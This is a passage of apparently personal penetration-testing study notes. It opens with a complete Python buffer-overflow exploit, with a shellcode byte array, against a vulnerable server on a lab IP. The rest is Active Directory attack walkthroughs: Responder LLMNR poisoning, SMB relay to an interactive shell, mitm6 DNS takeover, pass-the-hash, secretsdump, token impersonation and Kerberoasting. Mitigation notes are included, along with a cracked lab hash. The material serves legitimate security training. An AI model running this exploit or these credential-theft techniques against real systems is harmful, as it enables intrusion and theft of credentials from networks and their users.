	<span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="sh">'</span><span class="s">172.16.127.128</span><span class="sh">'</span><span class="p">,</span><span class="mi">9999</span><span class="p">))</span>
	<span class="n">s</span><span class="p">.</span><span class="nf">send</span><span class="p">((</span><span class="sh">'</span><span class="s">TRUN /.:/</span><span class="sh">'</span> <span class="o">+</span> <span class="n">shellcode</span><span class="p">))</span>
	<span class="n">s</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
<span class="k">except</span><span class="p">:</span>
	<span class="k">print</span> <span class="sh">"</span><span class="s">Error connecting to server</span><span class="sh">"</span>
	<span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">()</span>

</code></pre></div></div>

<blockquote>
  <p>set netcat and run the exploit
we have root</p>
</blockquote>

<h2 id="exploit-development-using-python3-and-mona">Exploit Development Using Python3 and Mona</h2>

<p>in immunity:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">!</span>mona config <span class="nt">-set</span> workingfolder c:<span class="se">\m</span>ona
<span class="o">!</span>mona bytearray <span class="nt">-cpb</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">0a"</span>
<span class="o">!</span>mona compare <span class="nt">-f</span> c:<span class="se">\m</span>ona<span class="se">\b</span>ytearray.bin <span class="nt">-a</span> &lt;ESP&gt;

<span class="o">!</span>mona jmp <span class="nt">-r</span> ESP <span class="nt">-m</span> <span class="s2">"essfunc.dll"</span>
</code></pre></div></div>
<p>ESP 015919F8</p>

<ul>
  <li>A couple of changes using python3</li>
  <li>example print(“”) with parenteses and payload should be encoded</li>
  <li>every input should be byte encoded like b(“\x00\x01”)</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="c1">#!/usr/bin/python3
</span><span class="kn">import</span> <span class="n">sys</span><span class="p">,</span> <span class="n">socket</span>

<span class="n">offset</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span> <span class="o">*</span> <span class="mi">2003</span>
<span class="n">pointer</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xaf\x11\x50\x62</span><span class="sh">"</span>
<span class="n">overflow</span> <span class="o">=</span> <span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="se">\xb8\x1e\x4c\x2e\xcc\xd9\xc9\xd9\x74\x24\xf4\x5f\x2b\xc9\xb1</span><span class="sh">"</span>
<span class="sa">b</span><span class="sh">"</span><span class="se">\x52\x31\x47\x12\x03\x47\x12\x83\xd9\x48\xcc\x39\x19\xb8\x92</span><span class="sh">"</span>
<span class="sa">b</span><span class="sh">"</span><span class="se">\xc2\xe1\x39\xf3\x4b\x04\x08\x33\x2f\x4d\x3b\x83\x3b\x03\xb0</span><span class="sh">"</span>
<span class="sa">b</span><span class="sh">"</span><span class="se">\x68\x69\xb7\x43\x1c\xa6\xb8\xe4\xab\x90\xf7\xf5\x80\xe1\x96</span><span class="sh">"</span>
<span class="sa">b</span><span class="sh">"</span><span class="se">\x75\xdb\x35\x78\x47\x14\x48\x79\x80\x49\xa1\x2b\x59\x05\x14</span><span class="sh">"</span>
<span class="sa">b</span><span class="sh">"</span><span class="se">\xdb\xee\x53\xa5\x50\xbc\x72\xad\x85\x75\x74\x9c\x18\x0d\x2f</span><span class="sh">"</span>
<span class="sa">b</span><span class="sh">"</span><span class="se">\x3e\x9b\xc2\x5b\x77\x83\x07\x61\xc1\x38\xf3\x1d\xd0\xe8\xcd</span><span class="sh">"</span>
<span class="sa">b</span><span class="sh">"</span><span class="se">\xde\x7f\xd5\xe1\x2c\x81\x12\xc5\xce\xf4\x6a\x35\x72\x0f\xa9</span><span class="sh">"</span>
<span class="sa">b</span><span class="sh">"</span><span class="se">\x47\xa8\x9a\x29\xef\x3b\x3c\x95\x11\xef\xdb\x5e\x1d\x44\xaf</span><span class="sh">"</span>
<span class="sa">b</span><span class="sh">"</span><span class="se">\x38\x02\x5b\x7c\x33\x3e\xd0\x83\x93\xb6\xa2\xa7\x37\x92\x71</span><span class="sh">"</span>
<span class="sa">b</span><span class="sh">"</span><span class="se">\xc9\x6e\x7e\xd7\xf6\x70\x21\x88\x52\xfb\xcc\xdd\xee\xa6\x98</span><span class="sh">"</span>
<span class="sa">b</span><span class="sh">"</span><span class="se">\x12\xc3\x58\x59\x3d\x54\x2b\x6b\xe2\xce\xa3\xc7\x6b\xc9\x34</span><span class="sh">"</span>
<span class="sa">b</span><span class="sh">"</span><span class="se">\x27\x46\xad\xaa\xd6\x69\xce\xe3\x1c\x3d\x9e\x9b\xb5\x3e\x75</span><span class="sh">"</span>
<span class="sa">b</span><span class="sh">"</span><span class="se">\x5b\x39\xeb\xda\x0b\x95\x44\x9b\xfb\x55\x35\x73\x11\x5a\x6a</span><span class="sh">"</span>
<span class="sa">b</span><span class="sh">"</span><span class="se">\x63\x1a\xb0\x03\x0e\xe1\x53\xec\x67\xe9\xa8\x84\x75\xe9\xbf</span><span class="sh">"</span>
<span class="sa">b</span><span class="sh">"</span><span class="se">\x08\xf3\x0f\xd5\xa0\x55\x98\x42\x58\xfc\x52\xf2\xa5\x2a\x1f</span><span class="sh">"</span>
<span class="sa">b</span><span class="sh">"</span><span class="se">\x34\x2d\xd9\xe0\xfb\xc6\x94\xf2\x6c\x27\xe3\xa8\x3b\x38\xd9</span><span class="sh">"</span>
<span class="sa">b</span><span class="sh">"</span><span class="se">\xc4\xa0\xab\x86\x14\xae\xd7\x10\x43\xe7\x26\x69\x01\x15\x10</span><span class="sh">"</span>
<span class="sa">b</span><span class="sh">"</span><span class="se">\xc3\x37\xe4\xc4\x2c\xf3\x33\x35\xb2\xfa\xb6\x01\x90\xec\x0e</span><span class="sh">"</span>
<span class="sa">b</span><span class="sh">"</span><span class="se">\x89\x9c\x58\xdf\xdc\x4a\x36\x99\xb6\x3c\xe0\x73\x64\x97\x64</span><span class="sh">"</span>
<span class="sa">b</span><span class="sh">"</span><span class="se">\x05\x46\x28\xf2\x0a\x83\xde\x1a\xba\x7a\xa7\x25\x73\xeb\x2f</span><span class="sh">"</span>
<span class="sa">b</span><span class="sh">"</span><span class="se">\x5e\x69\x8b\xd0\xb5\x29\xab\x32\x1f\x44\x44\xeb\xca\xe5\x09</span><span class="sh">"</span>
<span class="sa">b</span><span class="sh">"</span><span class="se">\x0c\x21\x29\x34\x8f\xc3\xd2\xc3\x8f\xa6\xd7\x88\x17\x5b\xaa</span><span class="sh">"</span>
<span class="sa">b</span><span class="sh">"</span><span class="se">\x81\xfd\x5b\x19\xa1\xd7</span><span class="sh">"</span><span class="p">)</span>

<span class="n">padding</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x90</span><span class="sh">"</span> <span class="o">*</span> <span class="mi">20</span>

<span class="n">shellcode</span> <span class="o">=</span> <span class="n">offset</span> <span class="o">+</span> <span class="n">pointer</span> <span class="o">+</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">overflow</span>

<span class="k">try</span><span class="p">:</span>
  <span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
  <span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="sh">'</span><span class="s">172.16.127.128</span><span class="sh">'</span><span class="p">,</span><span class="mi">9999</span><span class="p">))</span>
  <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">TRUN /.:/</span><span class="sh">"</span> <span class="o">+</span> <span class="n">shellcode</span>

<span class="c1"># we could use payload.encode, but sometimes the payload does not work
# thats why we are byte encoding manually every input
</span>
  <span class="n">s</span><span class="p">.</span><span class="nf">send</span><span class="p">((</span><span class="n">payload</span><span class="p">))</span>
  <span class="n">s</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
<span class="k">except</span><span class="p">:</span>
  <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Error connecting to server</span><span class="sh">"</span><span class="p">)</span>
  <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">()</span>

</code></pre></div></div>

<h1 id="ad">AD</h1>

<p>Authenticates using Kerberos tickets:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>non-Windows devices, such as Linux machines, firewalls, etc. 
Can also authenticate to AD via RADIUS or LDAP
</code></pre></div></div>

<h2 id="physical-ad-components">Physical AD Components</h2>

<h3 id="domain-controller">Domain Controller</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Host a copy of the AD DS directory store
Provide authentication and authorization services
Replicate updates to other domain controllers in the domain and forest
Allow administrative access to manage user accounts and network resources
</code></pre></div></div>

<h3 id="the-ad-ds-data-store">The AD DS data store</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Consists of the Ntds.dit file
Is stored by default in the %SystemRoot%\NTDS folder on all domain controllers
Is accessible only through the domain controller processes and protocols
</code></pre></div></div>

<h2 id="logical-ad-components">Logical AD Components</h2>

<h3 id="ad-ds-schema">AD DS Schema</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Enforces rules regarding object creation and configuration
</code></pre></div></div>

<h3 id="domain">Domain</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Used to group and manage objects in an organization
</code></pre></div></div>

<h3 id="trees">Trees</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Hierarchy of domains in AD DS
Share a contiguous namespace with the parent domain
Can have additional child domains
</code></pre></div></div>

<h3 id="forest">Forest</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Collection of one or more trees
Share a common schema
Share the enterprise Admins and Schema Admins groups
</code></pre></div></div>

<h3 id="organizational-units-ous">Organizational Units (Ous)</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>AD containers that contain users, groups, computers and others OUs
Delegate permissions to administer groups of objects
Represent your organization hierarchically and logically
</code></pre></div></div>

<h3 id="trusts">Trusts</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>How we have access between resources:
Directional = trust goes to trusted domain to a trusted domain
Transitive = trust relationship is extended beyond a two-domain trust
</code></pre></div></div>

<h3 id="objects">Objects</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whats inside OUs:
user, group, computer, printers, contacts, shared folders, etc
</code></pre></div></div>

<h2 id="lab-overview-and-requirements">Lab Overview and Requirements</h2>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1 Windows Server 2019
2 Windows 10 Enterprise

Requirements:
60 GB Disk Space
16 GB RAM
</code></pre></div></div>

<h3 id="links">Links</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://www.microsoft.com/pt-br/evalcenter/evaluate-windows-10-enterprise
https://www.microsoft.com/pt-br/evalcenter/evaluate-windows-server-2019
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Install AD DS on server
setup the AD
change the names of the computers
</code></pre></div></div>

<h3 id="cmd-with-admin-privileges">cmd with admin privileges</h3>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>setspn <span class="nt">-a</span> SAIBOT-DC/SQLService.MK.local:60111 MK<span class="se">\S</span>QLService
<span class="c"># -a = domain controller </span>
</code></pre></div></div>

<h3 id="create-a-gpo-in-the-forest-domain---disable-windows-defender">Create a GPO in the forest domain, - disable windows defender</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>windows &gt; administrative &gt; Windows components &gt; Windows defender &gt; disable w defender
set the enforced option in GPO &gt; Rule &gt; scope &gt; enforced = "yes"
This will make sure that every machine in the domain, disable the windows defender
</code></pre></div></div>

<ul>
  <li>add both machines to the domain</li>
  <li>log with administrator in both machines and</li>
  <li>add one user to local admin in his machine and another with local admin in the 2 machines</li>
  <li>create a file called <strong>share</strong> in C:\ in both machines</li>
</ul>

<h2 id="attacking-ad-initial-attack-vectors">Attacking AD: Initial Attack Vectors</h2>

<h3 id="llmnr---poisoning">LLMNR - Poisoning</h3>
<p>Used to identify hosts when DNS fails to do so.</p>

<p><strong>Step 1</strong>:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Run Responder
python Responder.py -I tun0 -rdw
</code></pre></div></div>

<p><strong>Step 2</strong>:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>An Event Occurs...
</code></pre></div></div>
<p><strong>Step 3</strong>:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get Dem Hashes
</code></pre></div></div>
<p><strong>Step 4</strong>:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Crack Dem Hashes:
hashcat -m 5600 hash.txt rockyou.txt
</code></pre></div></div>

<h3 id="smb-relay">SMB Relay</h3>
<p>Instead of cracking hashes, we can relay those hashes to specific machines and potentially gain access</p>

<p>SMB signing must be disabled on the target</p>

<p><strong>Step 1</strong>:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	Run Responder -&gt; nano responder.conf
	disable SMB and HTTP -&gt; cause we are going to be listening but not responding back
</code></pre></div></div>

<p><strong>Step 2</strong>:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python Responder.py <span class="nt">-I</span> tun0 <span class="nt">-rdw</span>
</code></pre></div></div>

<p><strong>Step 3</strong>:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Set up your relay:
python ntlmrelayx.py <span class="nt">-tf</span> target.txt <span class="nt">-smb2support</span>
</code></pre></div></div>

<p><strong>Step 4</strong>:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>An Event occours...
</code></pre></div></div>

<p><strong>Step 5</strong>:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Win!
</code></pre></div></div>

<h3 id="ipv6-attacks-overview">IPv6 Attacks Overview</h3>
<p>We are gonna set a DNS to the Ipv6 because they generally do not have one.</p>

<p>So I will get information and set NTLM with MITM6 to create an account in DC
<strong>Step 1</strong>:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>download MITM6 &gt; https://github.com/dirkjanm/mitm6.git
</code></pre></div></div>
<p><strong>Step 2</strong>:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>In the server &gt; manage &gt;  add roles and features &gt; active directory certificate services &gt; cert authority
</code></pre></div></div>

<ul>
  <li>Take a look at PassBack attack - look at printers, sometimes we can redirect the networking in the config</li>
  <li>page of the printer to our kali machine and set up a netcat or a responder to get the password/access</li>
</ul>

<h3 id="llmnr">LLMNR</h3>

<p>IPS:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>server = 172.16.127.129
ermac-pc1 = 172.16.127.128
subzero-pc2 = 172.16.127.130
</code></pre></div></div>

<h4 id="responder">Responder</h4>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>responder <span class="nt">-I</span> eth0 <span class="nt">-rdw</span>

<span class="c"># tips is to run this tool early in the morning</span>
<span class="c"># any machine in the AD who access our attacker IP</span>
<span class="c"># the responder is gonna capture their hashes</span>
</code></pre></div></div>

<h4 id="go-crack-with-hashcat">Go crack with hashcat</h4>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hashcat <span class="nt">-m</span> 5600 <span class="nb">hash </span>rockyou.txt
<span class="c"># -m 5600 = NetNTLMv2</span>

ERMAC::MK:c1a71fa9c4173965:a53bb1b11fd1444e7ec42216ec49a04f:01010000000000008011f80f19c9d70150783cc36d9aafd40000000002000800410038005200360001001e00570049004e002d004a0056005800470054004c004200510049004f00540004003400570049004e002d004a0056005800470054004c004200510049004f0054002e0041003800520036002e004c004f00430041004c000300140041003800520036002e004c004f00430041004c000500140041003800520036002e004c004f00430041004c00070008008011f80f19c9d7010600040002000000080030003000000000000000010000000020000054c8bbe07c882c5bd501dc943c19e4c47c1ba84a9556cd1beb5930ca01be55b30a001000000000000000000000000000000000000900220063006900660073002f003100390032002e003100360038002e0030002e00310031000000000000000000:<span class="s1">'Password1'</span>
</code></pre></div></div>

<h4 id="mitigation---llmnr---nbt-ns">Mitigation - LLMNR - NBT-NS</h4>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Disable LLMNR and NBT-NS
Require Network Access Control
Require strong user passwords <span class="o">&gt;</span>14 characters + the more complex harder to attacker to <span class="nb">break </span>it
</code></pre></div></div>

<h3 id="smb-relay-1">SMB Relay</h3>

<h4 id="discovering-hosts-with-smb-signing-disabled">Discovering Hosts with SMB Signing Disabled</h4>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">--script</span><span class="o">=</span>smb2-security-mode.nse <span class="nt">-p</span> 445 &lt;ip&gt;/24
<span class="c"># 'Message signing enabled but not required' - This is what we need to perform this attack</span>

/etc/responder/Responder.conf
<span class="c"># turnoff SMB and HTTP</span>
</code></pre></div></div>

<p><strong>Attack walkthrough</strong>:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>responder <span class="nt">-I</span> eth0 <span class="nt">-rdw</span>
python ntlmrelayx.py <span class="nt">-tf</span> target.txt <span class="nt">-smb2support</span>

<span class="c"># connect to our attack IP</span>
<span class="c"># Get the SAM hashes = it would be like shadow in linux</span>
</code></pre></div></div>

<p><strong>With interactive shell</strong>:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>responder <span class="nt">-I</span> eth0 <span class="nt">-rdw</span>
python ntlmrelayx.py <span class="nt">-tf</span> target.txt <span class="nt">-smb2support</span> <span class="nt">-i</span>
<span class="c"># trigger the event connecting in our kali IP</span>
<span class="c"># Get the port of smb client shell in ntlmrelayx tab</span>

nc 127.0.0.1 &lt;port&gt;
<span class="c"># we got a smb shell</span>
<span class="c"># help to show options</span>

<span class="c"># in ntmlrelayx</span>
<span class="c"># -e = execute some program, msfvenom \for example</span>
<span class="c"># -c = command, "whoami", "dir", "reverse shell whatever" etc</span>

</code></pre></div></div>

<h4 id="mitigation---smb-relay">Mitigation - SMB Relay</h4>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Enable SMB signing on all devices</span>
<span class="c"># Disable NTLM authentication on network</span>
<span class="c"># Account tiering - limits domain admin to specifc tasks</span>
<span class="c"># Local admin restriction</span>

</code></pre></div></div>

<h3 id="gaining-shell-access">Gaining Shell Access</h3>

<h4 id="metasploit">Metasploit</h4>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>search psexec
  use exploit - t/windows/smb/psexec
  or exploit/windows/smb/psexec_psh
</code></pre></div></div>

<h4 id="psexecpy">psexec.py</h4>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>psexec.py &lt;domain/user:password@target ip&gt;
<span class="c"># example: psexec.py mk.local/subzero:Password3@172.16.127.130</span>
</code></pre></div></div>

<blockquote>
  <p>We can try use <strong>smbexec.py</strong> or <strong>wmiexec.py</strong> with the same syntax</p>
</blockquote>

<h3 id="ipv6-dns-takeover-via-mitm6">IPv6 DNS Takeover via MITM6</h3>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mitm6 <span class="nt">-d</span> mk.local
<span class="c"># -d &lt;domain&gt; </span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ntlmrelayx <span class="nt">-6</span> <span class="nt">-t</span> ldaps://172.16.127.129 <span class="nt">-wh</span> fakewpad.mk.local <span class="nt">-l</span> lootme
<span class="c"># ip = DC</span>
<span class="c"># -l = loot - to dump information</span>
</code></pre></div></div>
<h4 id="mitigation">Mitigation</h4>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- If you <span class="k">do </span>not use IPv6 the safest way to prevent mitm6 is to block DHCPv6 traffic and incoming router advertisements <span class="k">in </span>Windows Firewall via GPO.
- If WPAD is not <span class="k">in </span>use, disable via GPO and disable the WinHttpAutoProxySrc service
- Enable both LDAP signing and LDAP channel binding
- Consider Administrative <span class="nb">users </span>to the Protected Users group or marking them as Account is sensitive and can not be delegated, which will prevent any impersonation of that user via delegation.
</code></pre></div></div>

<h3 id="attacking-ad-strategies-and-other-vectors">Attacking AD Strategies and Other vectors</h3>

<p>Strategies:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Begin the day with <span class="s1">'mitm6'</span> or <span class="s1">'Responder'</span>
- Runs scans to generate traffic
- If scans are taking too long, look <span class="k">for </span>websites <span class="k">in </span>scope <span class="o">(</span>http_version<span class="o">)</span>
- Look <span class="k">for </span>default credentials on web logins <span class="o">&gt;</span> printers, jenkins, etc
- Think outside the box
</code></pre></div></div>

<h2 id="powerview-cheatsheet">PowerView CheatSheet</h2>
<p>→  https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993</p>

<h3 id="powerview">PowerView</h3>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Run</span><span class="w"> </span><span class="nx">PowerView:</span><span class="w">

</span><span class="n">powershell</span><span class="w"> </span><span class="nt">-ep</span><span class="w"> </span><span class="nx">bypass</span><span class="w">
</span><span class="c"># -ep = ExecutionPolicy</span><span class="w">
</span><span class="c"># . .\PowerView.ps1</span><span class="w">

</span><span class="n">Commands:</span><span class="w">
</span><span class="nx">Get-NetDomain</span><span class="w">
</span><span class="n">Get-NetDomainController</span><span class="w">
</span><span class="nx">Get-DomainPolicy</span><span class="w">
</span><span class="p">(</span><span class="n">Get-DomainPolicy</span><span class="p">)</span><span class="o">.</span><span class="s2">"system access"</span><span class="w">
</span><span class="n">Get-NetUser</span><span class="w">
</span><span class="nx">Get-NetUser</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nx">cn</span><span class="w"> </span><span class="nx">/</span><span class="w"> </span><span class="nx">samaccountname</span><span class="w"> </span><span class="nx">/</span><span class="w"> </span><span class="nx">description</span><span class="w"> </span><span class="nx">/</span><span class="w"> </span><span class="nx">etc</span><span class="w">
</span><span class="n">Get-UserProperty</span><span class="w">
</span><span class="nx">Get-UserProperty</span><span class="w"> </span><span class="nt">-Properties</span><span class="w"> </span><span class="nx">pwdlastset</span><span class="w"> </span><span class="nx">/</span><span class="w"> </span><span class="nx">logonaccount</span><span class="w"> </span><span class="nx">/</span><span class="w"> </span><span class="nx">badpwdcount</span><span class="w">
</span><span class="n">Get-NetComputer</span><span class="w">
</span><span class="nx">Get-NetComputer</span><span class="w"> </span><span class="nt">-FullData</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nx">OperatingSystem</span><span class="w">
</span><span class="n">Get-NetGroup</span><span class="w"> </span><span class="nt">-GroupName</span><span class="w"> </span><span class="o">*</span><span class="nx">admin</span><span class="o">*</span><span class="w">
</span><span class="n">Get-NetGroupMember</span><span class="w"> </span><span class="nt">-GroupName</span><span class="w"> </span><span class="s2">"Domain Admins"</span><span class="w">
</span><span class="n">Invoke-ShareFinder</span><span class="w">
</span><span class="nx">Get-NetGPO</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nx">displayname</span><span class="p">,</span><span class="w"> </span><span class="nx">whenchanged</span><span class="w">
</span></code></pre></div></div>

<h3 id="bloodhound">BloodHound</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>set neo4j
open bloodhound
Get a data collector to use Invoke-BloodHound
 →  https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1 
 → https://github.com/BloodHoundAD/SharpHound3
</code></pre></div></div>

<p>Pass the data collector to the Windows Machine:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">powershell</span><span class="w"> </span><span class="nt">-ep</span><span class="w"> </span><span class="nx">bypass</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="o">.</span><span class="w"> </span><span class="o">.</span><span class="nx">\SharpHound.ps1</span><span class="w">
</span><span class="n">Invoke-BloodHound</span><span class="w"> </span><span class="nt">-CollectionMethod</span><span class="w"> </span><span class="nx">All</span><span class="w"> </span><span class="nt">-Domain</span><span class="w"> </span><span class="nx">domain.local</span><span class="w"> </span><span class="nt">-ZipFileName</span><span class="w"> </span><span class="nx">file.zip</span><span class="w">
</span><span class="n">Send</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">file:</span><span class="w"> </span><span class="nx">\Downloads\file.zip</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">Kali</span><span class="w">
</span></code></pre></div></div>

<p>Go to BloodHound in Kali:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Upload Data <span class="o">&gt;</span> the zip file that we generate <span class="k">in </span>the Windows Machine
Enumeration <span class="nb">time</span><span class="o">!</span>
</code></pre></div></div>

<h2 id="post-compromise-attacks">Post-Compromise Attacks</h2>

<h3 id="additional-resources">Additional Resources</h3>

<ul>
  <li>https://adsecurity.org/</li>
  <li>http://blog.harmj0y.net/</li>
  <li>https://www.pentesteracademy.com/activedirectorylab</li>
</ul>

<h3 id="pass-the-password--pass-the-hash">Pass the Password &amp; Pass the Hash</h3>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec smb &lt;ip/CIDR&gt; <span class="nt">-u</span> &lt;user&gt; <span class="nt">-d</span> &lt;domain&gt; <span class="nt">-p</span> &lt;pass&gt;
crackmapexec smb &lt;ip/CIDR&gt; <span class="nt">-u</span> &lt;user&gt; <span class="nt">-d</span> &lt;domain&gt; <span class="nt">-H</span> &lt;<span class="nb">hash</span><span class="o">&gt;</span> <span class="nt">--local-auth</span>
<span class="c"># obs: Regarding the SAM hash, we always gonna get the second portion to pass/crack etc</span>
<span class="c"># --sam =try to dump the sam</span>
</code></pre></div></div>

<blockquote>
  <p>[To remember] You can pass around NTLM hashes, you can not pass NTLMv2 hashes</p>
</blockquote>

<p>Pass with psexec:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>psexec.py &lt;<span class="s2">"user"</span>:@ip&gt; <span class="nt">-hashes</span> &lt;the whole <span class="nb">hash</span><span class="o">&gt;</span>
</code></pre></div></div>

<p>Get hashes:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>secretsdump.py &lt;domain/user:password@target ip&gt;
</code></pre></div></div>

<h4 id="mitigation---pass-attacks">Mitigation - Pass Attacks</h4>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Avoid re-using <span class="nb">local </span>admin password
- Limit <span class="nb">who </span>is a <span class="nb">local </span>administrator <span class="o">(</span>least privilege<span class="o">)</span>
- Utilize strong passwords
- Privileges Access Management <span class="o">(</span>PAM<span class="o">)</span>
- Automatically rotate passwords 
</code></pre></div></div>

<h3 id="token-impersonation">Token Impersonation</h3>
<p>Temporary Keys that allow you access to a system</p>

<p>2 types:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Delegate: Created <span class="se">\f</span>or logging into a machine or RDP.
Impersonate: non-interactive such as attaching a network driver or a domain login script
</code></pre></div></div>

<p>In meterpreter:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>getuid
load incognito
list_tokens <span class="nt">-u</span>
impersonate_token &lt;domain<span class="se">\\</span>user&gt;
shell
</code></pre></div></div>

<blockquote>
  <p>We can use psexec.py in meterpreter to get the first access, then we can post-attack the token</p>
</blockquote>

<p>rev2self = to comeback to the last access in meterpreter</p>

<h4 id="mitigation---token-impersonation">Mitigation - Token Impersonation</h4>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Limit user/group token creation permissions
- Account tiering
- Local admin restriction
</code></pre></div></div>

<h3 id="kerberoasting">Kerberoasting</h3>

<p><strong>Overview</strong>:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- The user request the TGT from DC by sending his NTLM hash
- The DC answer with the TGT with kerberoasting hash
- When user wanna access any server, the user request the TGS from DC by sending the TGT
- The DC answer with the TGS with the servers account hash

Finally:
The user can access the service by sending the TGS
THe service will answer if thats valid or not
</code></pre></div></div>

<p><strong>Attack with impacket</strong>:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python GetUserSPNs.py &lt;domain/user:password&gt; <span class="nt">-dc-ip</span> &lt;ip of DC&gt; <span class="nt">-request</span>

<span class="c"># Get the TGS hash</span>
<span class="c"># crack it: hashcat -m 13100 hash.txt rockyou.txt</span>
</code></pre></div></div>

<h4 id="mitigation---keberroasting">Mitigation - Keberroasting</h4>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Strong passwords
- Least privilege
</code></pre></div></div>

<h3 id="group-policy-preferences-gpp-aka-ms14-025">Group Policy Preferences (GPP) AKA MS14-025</h3>

<p>To check if the vulnerabilty exists:</p>
